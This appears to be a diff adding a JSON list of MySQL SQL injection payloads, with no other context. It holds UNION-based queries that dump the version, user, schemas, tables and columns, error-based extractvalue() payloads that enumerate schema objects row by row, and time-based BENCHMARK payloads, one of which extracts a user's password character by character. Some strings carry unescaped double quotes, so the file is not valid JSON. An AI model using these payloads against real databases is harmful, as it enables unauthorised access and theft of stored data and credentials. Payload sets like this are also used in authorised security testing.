@@ -1,0 +1,21 @@
+[
+	" UNION ALL SELECT NULL, VERSION(); -- ",
+	" UNION ALL SELECT NULL, database(); -- ",
+	" UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- ",
+	" UNION ALL SELECT NULL, user(); --",
+	" UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES -- ",
+	" UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='table_schema_1'-- ",
+	" UNION ALL SELECT NULL,concat(0x28,column_name_1,0x3a,column_name_2,0x29) FROM table_name_1 -- ",
+	" UNION ALL SELECT NULL,concat(0x28,columnName1,0x3a,columnName2,0x29) FROM tableName1 --",
+	" UNION ALL SELECT NULL,concat(0x28,column_name_1,0x3a,column_name_2,0x29) FROM database_name_1.table_name_1-- ",
+	" AND extractvalue(rand(),concat(0x3a,version())) -- ",
+	" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))-- ",
+	" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 1,1)))-- ",
+	" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 2,1)))-- ",
+	" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 3,1)))-- ",
+	" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="database_name_1" LIMIT 0,1)))-- ",
+	" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME="table_name_1" LIMIT 0,1)))-- ",
+	" AND extractvalue(rand(),concat(0x3a,(SELECT concat(column_name_1,0x3a,column_name_2) FROM table_name_1 LIMIT 0,1)))-- ",
+	"BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))",
+	"1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1"
+]
